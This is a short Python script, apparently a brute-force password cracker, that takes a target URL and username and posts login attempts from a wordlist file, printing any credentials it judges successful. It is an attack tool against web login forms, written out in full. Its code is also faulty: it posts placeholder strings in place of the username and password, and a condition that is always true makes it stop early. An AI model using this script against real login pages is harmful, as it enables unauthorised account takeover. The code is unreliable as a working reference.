import requests
import time
import sys

url = input("Enter Target Url: ")
username = input("Enter Target Username: ")
error = input("Enter the password you know: ")

try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: "+ str(count) + ' Time For => ' + password)
            data_dict = {"username": "uname" ,"password":"pass", "login":"submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteForce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("wordlist.txt", "r") as passwords:
    bruteCracking(username,url,error)

print("[!!] password not in list")
